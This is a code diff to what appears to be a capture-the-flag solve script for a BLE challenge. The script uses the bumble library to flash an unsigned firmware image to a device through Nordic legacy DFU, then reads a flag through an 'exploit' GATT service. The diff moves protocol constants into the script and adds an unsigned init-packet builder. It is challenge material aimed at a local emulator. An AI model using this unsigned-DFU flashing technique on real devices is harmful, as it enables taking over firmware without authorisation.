@@ -11,6 +11,7 @@ from __future__ import annotations
 
 import argparse
 import asyncio
+from binascii import crc_hqx
 from contextlib import suppress
 import struct
 import time
@@ -20,16 +21,13 @@ from bumble.device import Device, Peer
 from bumble.hci import Address
 from bumble.transport import open_transport
 
-from hitcon_legacy_dfu.protocol import (
+from hitcon_legacy_dfu.gatt_ids import (
     CONTROL_POINT_UUID,
     MAINTENANCE_CONTROL_UUID,
     MAINTENANCE_SERVICE_UUID,
     PACKET_UUID,
     SERVICE_UUID,
-    DfuImageType,
     DfuOpcode,
-    DfuResponse,
-    LegacyInitPacket,
 )
 
 
@@ -39,12 +37,28 @@ EXPECTED_LOCAL_FLAG = b"CTF{local_emulator_test_flag}\n"
 GPIO_P0_IN = 0x5000_0510
 EXPLOIT_SERVICE_UUID = "5a1c2001-7c5d-4c8d-942c-a786c1d58b6d"
 EXPLOIT_VALUE_UUID = "5a1c2002-7c5d-4c8d-942c-a786c1d58b6d"
+APPLICATION_IMAGE_TYPE = 0x04
+DFU_SUCCESS = 0x01
 
 
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser()
     parser.add_argument("--transport", default="tcp-client:host:6402")
     return parser.parse_args()
+
+
+def make_init_packet(image: bytes) -> bytes:
+    """Build the unsigned SDK 11 application init packet used by the smoke test."""
+
+    return struct.pack(
+        "<HHIHHH",
+        0xFFFF,
+        0xFFFF,
+        0,
+        1,
+        0xFFFE,
+        crc_hqx(image, 0xFFFF),
+    ) + b"\x00\x00"
 
 
 def make_flag_payload(bytes_to_read: int) -> bytes:
@@ -245,16 +259,16 @@ async def run(args: argparse.Namespace) -> bytes:
 
             await dfu_peer.write_value(
                 control,
-                bytes((DfuOpcode.START_DFU, DfuImageType.APPLICATION)),
+                bytes((DfuOpcode.START_DFU, APPLICATION_IMAGE_TYPE)),
                 with_response=True,
             )
             await dfu_peer.write_value(packet, struct.pack("<III", 0, 0, len(image)))
             await expect_notification(
                 notifications,
-                bytes((DfuOpcode.RESPONSE_CODE, DfuOpcode.START_DFU, DfuResponse.SUCCESS)),
+                bytes((DfuOpcode.RESPONSE_CODE, DfuOpcode.START_DFU, DFU_SUCCESS)),
             )
 
-            init_packet = LegacyInitPacket.for_image(image).encode()
+            init_packet = make_init_packet(image)
             await dfu_peer.write_value(
                 control,
                 bytes((DfuOpcode.INITIALIZE_DFU_PARAMETERS, 0)),
@@ -272,7 +286,7 @@ async def run(args: argparse.Namespace) -> bytes:
                     (
                         DfuOpcode.RESPONSE_CODE,
                         DfuOpcode.INITIALIZE_DFU_PARAMETERS,
-                        DfuResponse.SUCCESS,
+                        DFU_SUCCESS,
                     )
                 ),
             )
@@ -295,7 +309,7 @@ async def run(args: argparse.Namespace) -> bytes:
                     (
                         DfuOpcode.RESPONSE_CODE,
                         DfuOpcode.RECEIVE_FIRMWARE_IMAGE,
-                        DfuResponse.SUCCESS,
+                        DFU_SUCCESS,
                     )
                 ),
             )
@@ -311,7 +325,7 @@ async def run(args: argparse.Namespace) -> bytes:
                     (
                         DfuOpcode.RESPONSE_CODE,
                         DfuOpcode.VALIDATE_FIRMWARE,
-                        DfuResponse.SUCCESS,
+                        DFU_SUCCESS,
                     )
                 ),
             )
